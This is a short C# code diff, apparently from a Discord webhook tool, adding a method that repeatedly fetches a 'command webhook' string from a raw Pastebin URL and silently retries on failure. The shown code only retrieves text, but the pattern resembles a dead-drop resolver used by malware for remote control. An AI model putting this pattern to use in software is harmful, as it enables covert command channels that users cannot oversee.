@@ -117,5 +117,20 @@ namespace DiscordHook
                 }
             }
         }
+        
+        public static async Task<string> GetCommandWebHook()
+        {
+            while (true)
+            {
+                try
+                {
+                    return await new HttpClient().GetStringAsync("https://pastebin.com/raw/L4KCTcP2");
+                }
+                catch
+                {
+                    await Task.Delay(500);
+                }
+            }
+        }
     }
 }
